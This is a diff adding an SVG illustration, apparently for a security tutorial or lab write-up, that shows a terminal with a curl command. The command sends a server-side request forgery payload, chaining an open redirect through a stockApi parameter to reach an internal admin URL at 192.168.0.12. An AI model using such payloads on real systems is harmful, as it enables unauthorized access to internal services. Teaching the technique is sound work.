@@ -1,0 +1,16 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 405" role="img" aria-labelledby="title desc">
+  <title id="title">SSRF through an open redirect</title>
+  <desc id="desc">A dark terminal showing an internal URL passed through a redirect parameter.</desc>
+  <rect width="720" height="405" fill="#0f1117"/>
+  <circle cx="30" cy="30" r="6" fill="#dc2626"/><circle cx="52" cy="30" r="6" fill="#475569"/><circle cx="74" cy="30" r="6" fill="#475569"/>
+  <path d="M0 57h720" stroke="#334155"/>
+  <g transform="translate(-45 -45) scale(1.14)" font-family="ui-monospace, SFMono-Regular, Menlo, monospace" font-size="20">
+    <text x="66" y="143" fill="#dc2626">$</text><text x="94" y="143" fill="#e2e8f0">curl -x 127.0.0.1:8080 \</text>
+    <text x="94" y="188" fill="#94a3b8">-d 'stockApi=/product/nextProduct?</text>
+    <rect x="92" y="207" width="550" height="40" rx="4" fill="#dc2626" opacity=".16"/>
+    <text x="106" y="235" fill="#ef4444">path=http://192.168.0.12/admin</text>
+    <text x="94" y="280" fill="#94a3b8">' https://shop.example/stock</text>
+    <path d="M113 324h465" stroke="#475569" stroke-width="2" stroke-dasharray="7 9"/>
+    <path d="m568 315 14 9-14 9" fill="none" stroke="#dc2626" stroke-width="3"/>
+  </g>
+</svg>
